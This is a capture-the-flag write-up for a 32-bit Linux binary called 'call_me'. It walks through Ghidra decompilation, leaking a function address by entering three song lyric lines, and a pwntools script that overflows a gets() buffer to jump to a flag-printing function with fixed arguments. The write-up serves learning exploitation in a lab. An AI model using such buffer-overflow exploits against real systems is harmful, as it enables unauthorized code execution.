# call_me

```bash
> file call_me_thaMilo
 
call_me_thaMilo: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=db2355e65f8ec0cdc5cdcfc5d4df617518c8a9f6, for GNU/Linux 3.2.0, stripped
```

In order to understand what the executable would normally do I tried to run it and when prompted I inserted random values.
Doing so I finally got this message outputted

```
Wow, you do know the song! However, you did not solve the challenge :-(
```

Reading this I thought that maybe some pattern matching was executed against the input looking for a specific song's lyrics.
Leveraging this I opened the file with Ghidra looking for something related.
Analysing the functions I found one with an interesting body

```c
void FUN_000111ed(int param_1,int param_2,int param_3)
{
	printf("BASC{");
	if (param_1 != 0xb100d) {
	    exit(1);
	}
	printf("you_g0t_");
	if (param_2 != 0x5e1ec7ed) {
	    exit(2);
	}
	printf("the_args_");
	if (param_3 != 0x7ea) {
        exit(3);
	}
	puts("right}.");
        exit(0x2a);
	}
```

This functions seemed to print a flag if some specific parameters where passed.
To better understand what was going on I used the functionality to show the functions' calls tree.
Doing so I discovered that the "print_flag" function was called by another one 

```c
void FUN_000112f8(void)
{
	char *pcVar1;
	int iVar2;
	char acStack_bd [165];
	size_t local_18;
	int local_14;
	int local_10;
  
	local_10 = 0;
	local_14 = 0;
	while( true ) {
	    if ((&PTR_s_Color_me_your_color,_baby_00014020)[local_14] == (undefined *)0x0) {
			puts("Wow, you do know the song! However, you did not solve the challenge :-(");
			return;
	    }
	    printf("Enter line #%d: ",local_14 + 1);
	    pcVar1 = gets(acStack_bd + 1);
	    if (pcVar1 == (char *)0x0) break;
	    local_18 = strlen(acStack_bd + 1);
	    if (0x50 < local_18) {
	      return;
	    }
	    if ((local_18 != 0) && (acStack_bd[local_18] == '\n')) {
	      acStack_bd[local_18] = '\0';
	    }
	    iVar2 = strcmp(acStack_bd + 1,(&PTR_s_Color_me_your_color,_baby_00014020)[local_14]);
	    if (iVar2 == 0) {
	      local_10 = local_10 + 1;
	      if (local_10 == 3) {
	        printf("&target=%p\n",print_flag);
	      }
	    }
	    else {
	      local_10 = local_10 + -1;
	    }
	    local_14 = local_14 + 1;
	  }
  return;
}
```

This function was actually the one that prompted the user to insert the song's lyrics and looking at the line 

```c
printf("Enter line #%d: ",local_14 + 1);
```

I understood that the variable **local_14** held a index that kept track the current song's lyrics line that would be later on compared with the one inserted by the user

```c
iVar2 = strcmp(acStack_bd + 1,(&PTR_s_Color_me_your_color,_baby_00014020)[local_14]);
```

If the comparison was successful the variable **local_10** would be incremented and when the value 3 was reached it should leak the address of the **print_flag** function.
So in order to get the address I had to insert three correct lines of the song's lyrics

```
> nc 192.168.20.1 5110
Enter line #1: Color me your color, baby
Enter line #2: Color me your car
Enter line #3: Color me your color, darling
&target=0x5664a1ed
```

After getting the leaked address I could finally exploit the program through the **gets** function vulnerability.

```c
pcVar1 = gets(acStack_bd + 1);
```

It is possible to conduct a buffer overflow attack pretty easily figuring out the offset necessary to fill the **acStack_bd** variable ( e.g. using a cyclic pattern ) and then returning to the leaked function's address.
I had also to pass the correct parameters leaked by the **print_flag** function in order to get the flag.
Adding a 4 bytes offset between the function address and the parameters was necessary due to the architecture calling convention.

```python
p = pwn.remote(HOST, PORT)
p.recvuntil(b":")
p.sendline(b"Color me your color, baby")
p.recvuntil(b":")
p.sendline(b"Color me your car")
p.recvuntil(b":")
p.sendline(b"Color me your color, darling")
leaked_address = p.recvuntil(b"target=")
leaked_address = p.recvline().strip().decode()
p.sendline(
	b"a" * OFFSET
	+ pwn.p32(int(leaked_address, 16))
	+ b"a" * 4
	+ pwn.p32(int(FIRST_PARAM, 16))
	+ pwn.p32(int(SECOND_PARAM, 16))
	+ pwn.p32(int(THIRD_PARAM, 16))
)
p.interactive()
```

Doing so I was able to get the first flag

```
BASC{you_g0t_the_args_right}
```


